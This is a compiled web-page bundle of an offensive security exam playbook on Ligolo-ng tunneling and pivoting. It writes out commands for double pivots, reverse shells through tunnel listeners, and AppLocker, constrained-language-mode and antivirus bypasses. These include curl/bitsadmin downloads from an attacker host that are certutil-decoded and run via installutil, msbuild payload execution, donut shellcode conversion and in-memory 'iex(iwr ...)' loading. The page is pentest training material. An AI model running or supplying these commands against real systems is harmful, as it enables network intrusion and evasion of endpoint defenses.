"use strict";(globalThis.webpackChunkmy_docs=globalThis.webpackChunkmy_docs||[]).push([[4580],{3641(e,n,s){s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>t,default:()=>h,frontMatter:()=>r,metadata:()=>l,toc:()=>d});const l=JSON.parse('{"id":"osep/Tunneling/Ligolo-ng","title":"Ligolo-ng","description":"Normal Instructions","source":"@site/docs/osep/Tunneling/Ligolo-ng.md","sourceDirName":"osep/Tunneling","slug":"/osep/Tunneling/Ligolo-ng","permalink":"/OSEP-Playbook/docs/osep/Tunneling/Ligolo-ng","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":1,"frontMatter":{"title":"Ligolo-ng","sidebar_position":1},"sidebar":"tutorialSidebar","previous":{"title":"Upgrading Shells","permalink":"/OSEP-Playbook/docs/osep/initial-access/Upgrading Shells"},"next":{"title":"Metasploit","permalink":"/OSEP-Playbook/docs/osep/Tunneling/Metasploit"}}');var i=s(4848),o=s(8453);const r={title:"Ligolo-ng",sidebar_position:1},t=void 0,c={},d=[{value:"<strong>Normal Instructions</strong>",id:"normal-instructions",level:3},{value:"<strong>Simple Tunneling</strong>",id:"simple-tunneling",level:3},{value:"<strong>Reverse Shells From Internal Networks</strong>",id:"reverse-shells-from-internal-networks",level:3},{value:"<strong>Double Tunneling</strong>",id:"double-tunneling",level:3},{value:"<strong>Local Port Forwarding</strong>",id:"local-port-forwarding",level:3},{value:"<strong>File Transfers From Internal Networks</strong>",id:"file-transfers-from-internal-networks",level:3},{value:"<strong>AV Bypassing</strong>",id:"av-bypassing",level:3},{value:"<strong>Agent AppLocker Bypass</strong>",id:"agent-applocker-bypass",level:3},{value:"<strong>Agent CLM Bypass</strong>",id:"agent-clm-bypass",level:3},{value:"<strong>Agent Shellcode Runner</strong>",id:"agent-shellcode-runner",level:3}];function a(e){const n={a:"a",code:"code",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,o.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h3,{id:"normal-instructions",children:(0,i.jsx)(n.strong,{children:"Normal Instructions"})}),"\n",(0,i.jsx)(n.h3,{id:"simple-tunneling",children:(0,i.jsx)(n.strong,{children:"Simple Tunneling"})}),"\n",(0,i.jsx)(n.p,{children:"Keep in mind that we should have already downloaded the proxy to our attacker machine, and have transfer the agent to the victim."}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Tunnel"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_tunnel.png",alt:"Ligolo Tunnel"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Find the network mask"}),", for example, if your IP address is\xa0",(0,i.jsx)(n.code,{children:"X.X.X.X"}),"\xa0and the subnet mask is\xa0",(0,i.jsx)(n.code,{children:"Y.Y.Y.Y"}),", the network will be\xa0",(0,i.jsx)(n.code,{children:"X.X.X.X/"}),"\xa0followed by the subnet prefix. For instance, with a subnet mask of\xa0",(0,i.jsx)(n.code,{children:"255.255.255.0"}),", the network prefix would be\xa0",(0,i.jsx)(n.code,{children:"/24"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Create the interface"}),"\xa0for\xa0",(0,i.jsx)(n.code,{children:"ligolo"}),"\xa0in my Kali"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"sudo ip tuntap add user [kali_user] mode tun ligolo\n\nsudo ip link set ligolo up\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Enable the proxy server"}),"\xa0on the attacker machine"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# The option -selfcert is for not using a certificate (this will make our communications in clear text), we do not need to encrypt them for the exam.\n./ligolo_proxy_linux -selfcert\nor\n./ligolo_proxy_linux -selfcert -port <DIFFERENT_PROXY_PORT>\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Download\xa0",(0,i.jsx)(n.strong,{children:"(bring) the agent"}),"\xa0program to the victim (in this example Windows)"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"iwr -uri http://[attacker_ip]/ligolo_agent_windows.exe -UseBasicParsing -Outfile ligolo_agent_windows.exe\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.strong,{children:"Start the client"})}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# The port is the default one, we could also change it if needed.\n./ligolo_agent_windows.exe -connect [attacker_ip]:11601 -ignore-cert\nor\n./ligolo_agent_windows.exe -connect [attacker_ip]:<DIFFERENT_PROXY_PORT> -ignore-cert\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Add the route"}),"\xa0in the Kali"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Run this command in other terminal that from the one where ligolo proxy is running\nsudo ip route add [internal_submask]/24 dev ligolo\n\n# Verify routing table\nip route list\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Finish"}),"\xa0setting up the tunneling session"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Run this commands in the ligolo proxy terminal\n\xbb session\n\xbb start\n\n# After this the tunneling should be ready, you could perform any command.\n\n"})}),"\n",(0,i.jsx)(n.h3,{id:"reverse-shells-from-internal-networks",children:(0,i.jsx)(n.strong,{children:"Reverse Shells From Internal Networks"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Setup the Netcat listener in our Kali"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"nc -nvlp [kali_port]\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Setup a listener for the reverse shell in the Ligolo session"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Agent Listener"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_10.png",alt:"Ligolo Agent Listener"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Run a reverse shell command or a payload created with\xa0",(0,i.jsx)(n.code,{children:"msfvenom"})]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"[command_to_run_reverse_shell] -L [kali_ip]:[kali_port]\nor\n./payload.exe\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Download"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_11.png",alt:"Ligolo Download"})}),"\n",(0,i.jsx)(n.h3,{id:"double-tunneling",children:(0,i.jsx)(n.strong,{children:"Double Tunneling"})}),"\n",(0,i.jsx)(n.p,{children:"In certain cases, the recently compromised host will have two interfaces, enabling you to explore the network further and find more hosts. In this scenario, you'll need to execute a double pivot."}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Double Tunnel"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_double_tunnel.png",alt:"Ligolo Double Tunnel"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Add a second interface"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"sudo ip tuntap add user [kali_user] mode tun ligolo_double\n\nsudo ip link set ligolo_double up\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Create a listener"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# The next step is to add a listener on port 11601 to our existing Ligolo-ng session and redirect it to our machine.\nlistener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp\n\n# Verify it's been added\nlistener_list\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Agent Listener"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_01.png",alt:"Ligolo Agent Listener"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Connect to the proxy server"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# Next, we need to execute the agent on the Windows host to connect to the forwarded port on our attacker machine\n./agent.exe -connect <IP of First Pivot Point>:11601 -ignore-cert\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Agent Listener"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_02.png",alt:"Ligolo Agent Listener"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Verify the connection on Kali by checking if the Windows agent has connected via the forwarded port."}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Agent Joined"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_03.png",alt:"Ligolo Agent Joined"})}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Start a tunnel and add a route"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Our last step is to change our session to the second pivot point (Windows), start the tunnel, and then add a route to the newly discovered network at 10.1.30.0/24.\nsudo ip add route <New_Network> dev ligolo_double\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"We'll be able to interact with the new network from our Kali machine and run all the same tools as we did with the single pivot."}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Agent Session"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_04.png",alt:"Ligolo Agent Session"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Add New Route"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_05.png",alt:"Ligolo Add New Route"})}),"\n",(0,i.jsx)(n.p,{children:"You could continue with a triple pivot using Ligolo-ng, following the same steps as we did with the double pivot."}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Tunnel Test"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_06.png",alt:"Ligolo Tunnel Test"})}),"\n",(0,i.jsx)(n.h3,{id:"local-port-forwarding",children:(0,i.jsx)(n.strong,{children:"Local Port Forwarding"})}),"\n",(0,i.jsxs)(n.p,{children:["Local port forwarding is useful when you encounter an internal server on the victim machine that only accepts connections from the local machine. By using a\xa0",(0,i.jsx)(n.strong,{children:"special hardcoded IP address"}),",\xa0",(0,i.jsx)(n.code,{children:"Ligolo-ng"}),"\xa0facilitates this process; to set up local port forwarding,\xa0",(0,i.jsx)(n.strong,{children:"follow these steps"}),":"]}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Ensure Tunneling is Configured"}),": make sure you have already established the tunneling with\xa0",(0,i.jsx)(n.code,{children:"Ligolo-ng"}),"\xa0and that your network interface is set up correctly as\xa0",(0,i.jsx)(n.code,{children:"ligolo"}),"."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Add the Special IP Address"}),": use the following command to add a special IP address that\xa0",(0,i.jsx)(n.code,{children:"Ligolo-ng"}),"\xa0recognizes as the local endpoint for port forwarding."]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# Add a special hardcoded IP for local port forwarding.\nsudo ip route add 240.0.0.1/32 dev ligolo\n\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Explanation"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:(0,i.jsx)(n.code,{children:"240.0.0.1/32"})}),": this is a special hardcoded IP address that\xa0",(0,i.jsx)(n.code,{children:"Ligolo-ng"}),"\xa0understands; by adding this route, you inform the system to route traffic intended for this IP through the\xa0",(0,i.jsx)(n.code,{children:"ligolo"}),"\xa0interface to the victim machine where the client is running."]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:(0,i.jsx)(n.code,{children:"dev ligolo"})}),": this specifies the device (or network interface) through which the routing will occur, ensuring that all traffic directed to\xa0",(0,i.jsx)(n.code,{children:"240.0.0.1"}),"\xa0is channeled through the established tunnel."]}),"\n"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.strong,{children:"Examples"}),": just with that command we can now connect to the internal services of the victim machine, either by using commands or other types of services like HTTP."]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(poiint\u327fKali)-[~]\n\u2514\u2500$ nmap 240.0.0.1 -sV\n\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp open http Apache httpd 2.4.29 ((Ubuntu))631/tcp open ipp CUPS 2.2\n3306/tcp open mysql MySQL 5.7.29-0ubuntu0.18.04.1\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Port Forwarding"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_port_forwarding.png",alt:"Ligolo Port Forwarding"})}),"\n",(0,i.jsx)(n.h3,{id:"file-transfers-from-internal-networks",children:(0,i.jsx)(n.strong,{children:"File Transfers From Internal Networks"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Setup a listener in the Ligolo session"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"listener_add --addr 0.0.0.0:[agent_port] --to 127.0.0.1:[kali_port] --tcp\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Agent Listener"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_07.png",alt:"Ligolo Agent Listener"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Host the file in our Kali"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"python3 -m http.server [kali_port]\n\n"})}),"\n",(0,i.jsx)(n.p,{children:"HTTP Server"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_08.png",alt:"HTTP Server"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Download the file on the compromised Windows host"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'Invoke-WebRequest -Uri "http://[agent_ip]:[agent_port]/[file_name]" -OutFile [file_name]\n\n'})}),"\n",(0,i.jsx)(n.p,{children:"HTTP Server"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo_08.png",alt:"HTTP Server"})}),"\n",(0,i.jsx)(n.h3,{id:"av-bypassing",children:(0,i.jsx)(n.strong,{children:"AV Bypassing"})}),"\n",(0,i.jsx)(n.h3,{id:"agent-applocker-bypass",children:(0,i.jsx)(n.strong,{children:"Agent AppLocker Bypass"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/LorisDietrich/ApplockerBypassExternalBinary",children:"GitHub Reference"})}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsxs)(n.p,{children:["Modify the file\xa0",(0,i.jsx)(n.code,{children:"/ligolo-ng/cmd/agent/main.go"}),", like below so that it points to your IP."]}),"\n",(0,i.jsx)(n.p,{children:"Ligolo Code Modification"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{src:"https://www.emmanuelsolis.com/img/ligolo1.png",alt:"Ligolo Code Modification"})}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["\n",(0,i.jsx)(n.p,{children:"Compile the code"}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:"# From Kali\nGOOS=windows go build -o agent.exe cmd/agent/main.go\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Here you have two options, use the already compile file\xa0",(0,i.jsx)(n.code,{children:"ApplockerBypassExternalBinary.exe"}),"\xa0from the GitHub or build you own using the solution provided in the folder\xa0",(0,i.jsx)(n.code,{children:"ApplockerBypassExternalBinary"}),", if you are building your own executable do the following:","\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsx)(n.li,{children:"Add required reference: Add the System.Configuration.Install reference to the project."}),"\n",(0,i.jsxs)(n.li,{children:["Compile the project: Ensure the project is compiled as\xa0",(0,i.jsx)(n.strong,{children:"Release"}),"\xa0and\xa0",(0,i.jsx)(n.strong,{children:"x64"}),"\xa0for compatibility."]}),"\n"]}),"\n"]}),"\n",(0,i.jsxs)(n.li,{children:["Encode the executable with\xa0",(0,i.jsx)(n.code,{children:"certutil"})]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# From Windows\ncertutil -encode .\\ApplockerBypassExternalBinary.exe AppLockerBypassLigolo.txt\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Rename\xa0",(0,i.jsx)(n.code,{children:"agent.exe"}),"\xa0to\xa0",(0,i.jsx)(n.code,{children:"ligolo-agent.exe"})]}),"\n",(0,i.jsx)(n.li,{children:"Download and execute from victim"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:'# Option 1 - curl\ncmd.exe /c "curl http://[ATTACKER_IP]/ligolo-agent.exe -o C:\\users\\public\\try-agent.exe && curl http://[ATTACKER_IP]/AppLockerBypassLigolo.txt -o C:\\users\\public\\enc.txt && certutil -decode C:\\users\\public\\enc.txt C:\\users\\public\\ligolo.exe && del C:\\users\\public\\enc.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=true /U C:\\users\\public\\ligolo.exe"\n\n# Option 2 - bitsadmin\ncmd.exe /c "bitsadmin /Transfer myJob http://[ATTACKER_IP]/ligolo-agent.exe C:\\users\\public\\try-agent.exe && cmd /c bitsadmin /Transfer myJob http://[ATTACKER_IP]/pyhttp/AppLockerBypassLigolo.txt C:\\users\\public\\enc.txt && certutil -decode C:\\users\\public\\enc.txt C:\\users\\public\\ligolo.exe && del C:\\users\\public\\enc.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=true /U C:\\users\\public\\ligolo.exe"\n\n'})}),"\n",(0,i.jsx)(n.h3,{id:"agent-clm-bypass",children:(0,i.jsx)(n.strong,{children:"Agent CLM Bypass"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/emmasolis1/OSEP",children:"GitHub Reference"})}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Update\xa0",(0,i.jsx)(n.code,{children:"ligolo.ps1"}),"\xa0on line 14 and put our IP Address."]}),"\n",(0,i.jsxs)(n.li,{children:["Update\xa0",(0,i.jsx)(n.code,{children:"ligolo-clmbypass.xml"}),"\xa0on line 36 and put our IP Address."]}),"\n",(0,i.jsxs)(n.li,{children:["Download\xa0",(0,i.jsx)(n.code,{children:"ligolo-clmbypass.xml"}),"\xa0and execute it from the victim"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe ligolo-clmbypass.xml\n\n"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["(Optional) If this script\xa0",(0,i.jsx)(n.code,{children:"ligolo.ps1"}),"\xa0is caught by the AV, use the\xa0",(0,i.jsx)(n.code,{children:"ligolo-psrunner.ps1"}),"\xa0as alternative as it uses NT APIs only with sleeps between sensitive operations."]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"agent-shellcode-runner",children:(0,i.jsx)(n.strong,{children:"Agent Shellcode Runner"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:(0,i.jsx)(n.a,{href:"https://github.com/emmasolis1/OSEP",children:"GitHub Reference"})}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Requirements"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Agent for victim:\xa0",(0,i.jsx)(n.code,{children:"agent.exe"})]}),"\n",(0,i.jsxs)(n.li,{children:["File\xa0",(0,i.jsx)(n.code,{children:"ligolo.ps1"})]}),"\n",(0,i.jsxs)(n.li,{children:["Running in a x64bit process, check with:","\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["Powershell:\xa0",(0,i.jsx)(n.code,{children:"[Environment]::Is64BitProcess"})]}),"\n",(0,i.jsxs)(n.li,{children:["CMD:\xa0",(0,i.jsx)(n.code,{children:"set p"}),"\xa0(Should show\xa0",(0,i.jsx)(n.code,{children:"PROCESSOR_ARCHITECTURE=AMD64"}),")"]}),"\n"]}),"\n"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Steps"})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Convert\xa0",(0,i.jsx)(n.code,{children:"agent.exe"}),"\xa0to shellcode"]}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-bash",children:'# From Kali\ndonut -f 1 -o agent.bin -a 2 -p "-connect [ATTACKER_IP]:11601 -ignore-cert" -i agent.exe\n\n'})}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:["Update\xa0",(0,i.jsx)(n.code,{children:"ligolo.ps1"}),"\xa0on line 14 and put our IP Address."]}),"\n",(0,i.jsxs)(n.li,{children:["(Optional) If this script\xa0",(0,i.jsx)(n.code,{children:"ligolo.ps1"}),"\xa0is caught by the AV, use the\xa0",(0,i.jsx)(n.code,{children:"ligolo-psrunner.ps1"}),"\xa0as alternative as it uses NT APIs only with sleeps between sensitive operations."]}),"\n",(0,i.jsx)(n.li,{children:"Download and execute Ligolo from the victim"}),"\n"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-powershell",children:"# Direct memory loading\niex(iwr http://[ATTACKER_IP]/ligolo.ps1 -UseBasicParsing)\n\n"})})]})}function h(e={}){const{wrapper:n}={...(0,o.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(a,{...e})}):a(e)}},8453(e,n,s){s.d(n,{R:()=>r,x:()=>t});var l=s(6540);const i={},o=l.createContext(i);function r(e){const n=l.useContext(o);return l.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function t(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),l.createElement(o.Provider,{value:n},e.children)}}}]);